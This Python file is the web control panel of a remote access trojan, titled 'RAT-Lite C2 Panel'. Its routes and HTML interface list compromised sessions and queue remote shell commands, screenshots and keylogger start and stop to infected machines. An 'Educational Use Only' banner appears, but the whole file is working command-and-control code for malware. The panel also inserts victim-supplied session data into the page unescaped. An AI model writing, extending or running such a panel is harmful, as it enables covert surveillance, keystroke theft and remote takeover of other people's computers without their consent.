#!/usr/bin/env python3
"""
Web-based control panel using aiohttp
"""

import asyncio
import json
from aiohttp import web


class WebPanel:
    def __init__(self, session_manager, command_handler, port=8080):
        self.sessions = session_manager
        self.commands = command_handler
        self.port = port
        self.app = web.Application()
        self._setup_routes()
    
    def _setup_routes(self):
        self.app.router.add_get('/', self.index)
        self.app.router.add_get('/api/sessions', self.api_sessions)
        self.app.router.add_post('/api/command/{session_id}', self.api_command)
        self.app.router.add_get('/api/response/{session_id}/{cmd_id}', self.api_response)
        self.app.router.add_static('/static', 'static', show_index=True)
    
    async def index(self, request):
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>RAT-Lite C2 Panel</title>
            <style>
                body { font-family: monospace; background: #0a0a0a; color: #00ff00; margin: 0; }
                .header { padding: 20px; border-bottom: 1px solid #00ff00; }
                .container { display: flex; height: calc(100vh - 80px); }
                .sidebar { width: 300px; border-right: 1px solid #00ff00; padding: 20px; overflow-y: auto; }
                .main { flex: 1; padding: 20px; overflow-y: auto; }
                .session-card { border: 1px solid #00ff00; padding: 10px; margin: 10px 0; cursor: pointer; }
                .session-card:hover { background: #001100; }
                .session-card.active { background: #002200; }
                .cmd-input { width: 100%; padding: 10px; background: #0a0a0a; color: #00ff00; 
                             border: 1px solid #00ff00; font-family: monospace; }
                .output { background: #001100; border: 1px solid #00ff00; padding: 15px; 
                          min-height: 300px; white-space: pre-wrap; overflow-y: auto; }
                button { background: #0a0a0a; color: #00ff00; border: 1px solid #00ff00; 
                         padding: 10px 20px; cursor: pointer; font-family: monospace; }
                button:hover { background: #00ff00; color: #0a0a0a; }
                .danger { color: #ff0000; border-color: #ff0000; }
                .danger:hover { background: #ff0000; color: #0a0a0a; }
            </style>
        </head>
        <body>
            <div class="header">
                <h1>RAT-Lite C2 Panel</h1>
                <span>Educational Use Only | Authorized Testing Only</span>
            </div>
            <div class="container">
                <div class="sidebar">
                    <h3>Sessions</h3>
                    <div id="sessions"></div>
                    <button onclick="refreshSessions()">Refresh</button>
                </div>
                <div class="main">
                    <h3>Terminal</h3>
                    <div id="session-info"></div>
                    <div class="output" id="output"></div>
                    <input type="text" class="cmd-input" id="cmd" placeholder="Enter command..."
                           onkeypress="if(event.key==='Enter')sendCommand()">
                    <div style="margin-top: 10px;">
                        <button onclick="sendCommand()">Execute</button>
                        <button class="danger" onclick="sendCommandType('screenshot')">Screenshot</button>
                        <button class="danger" onclick="sendCommandType('keylog_start')">Keylog Start</button>
                        <button class="danger" onclick="sendCommandType('keylog_stop')">Keylog Stop</button>
                        <button class="danger" onclick="sendCommandType('exit')">Kill Session</button>
                    </div>
                </div>
            </div>
            <script>
                let currentSession = null;
                
                async function refreshSessions() {
                    const res = await fetch('/api/sessions');
                    const data = await res.json();
                    const div = document.getElementById('sessions');
                    div.innerHTML = data.sessions.map(s => `
                        <div class="session-card ${s.id === currentSession ? 'active' : ''}" 
                             onclick="selectSession('${s.id}')">
                            <strong>${s.id}</strong><br>
                            ${s.addr[0]}:${s.addr[1]}<<br>
                            <small>${s.status} | ${s.system_info.os || 'Unknown'}</small>
                        </div>
                    `).join('');
                }
                
                function selectSession(id) {
                    currentSession = id;
                    document.getElementById('session-info').innerHTML = `<h4>Session: ${id}</h4>`;
                    refreshSessions();
                }
                
                async function sendCommand() {
                    if (!currentSession) return alert('Select a session first');
                    const cmd = document.getElementById('cmd').value;
                    const res = await fetch(`/api/command/${currentSession}`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({type: 'shell', args: {command: cmd}})
                    });
                    const data = await res.json();
                    document.getElementById('output').innerHTML += `\\n> ${cmd}\\n[Command queued: ${data.cmd_id}]\\n`;
                    pollResponse(data.cmd_id);
                }
                
                async function sendCommandType(type) {
                    if (!currentSession) return alert('Select a session first');
                    const res = await fetch(`/api/command/${currentSession}`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({type: type, args: {}})
                    });
                    const data = await res.json();
                    document.getElementById('output').innerHTML += `\\n> [${type}]\\n[Command queued: ${data.cmd_id}]\\n`;
                    pollResponse(data.cmd_id);
                }
                
                async function pollResponse(cmdId) {
                    for (let i = 0; i < 30; i++) {
                        await new Promise(r => setTimeout(r, 1000));
                        const res = await fetch(`/api/response/${currentSession}/${cmdId}`);
                        const data = await res.json();
                        if (data.found) {
                            document.getElementById('output').innerHTML += data.data + '\\n';
                            return;
                        }
                    }
                    document.getElementById('output').innerHTML += '[Timeout]\\n';
                }
                
                setInterval(refreshSessions, 5000);
                refreshSessions();
            </script>
        </body>
        </html>
        """
        return web.Response(text=html, content_type='text/html')
    
    async def api_sessions(self, request):
        return web.json_response({
            'sessions': self.sessions.list_sessions()
        })
    
    async def api_command(self, request):
        session_id = request.match_info['session_id']
        data = await request.json()
        
        cmd = self.commands.create_command(data['type'], **data.get('args', {}))
        await self.sessions.queue_command(session_id, cmd)
        
        return web.json_response({'status': 'queued', 'cmd_id': cmd['id']})
    
    async def api_response(self, request):
        session_id = request.match_info['session_id']
        cmd_id = request.match_info['cmd_id']
        
        response = self.sessions.get_response(session_id, cmd_id)
        if response:
            return web.json_response({'found': True, 'data': response['data']})
        return web.json_response({'found': False})
    
    async def start(self):
        runner = web.AppRunner(self.app)
        await runner.setup()
        site = web.TCPSite(runner, '0.0.0.0', self.port)
        await site.start()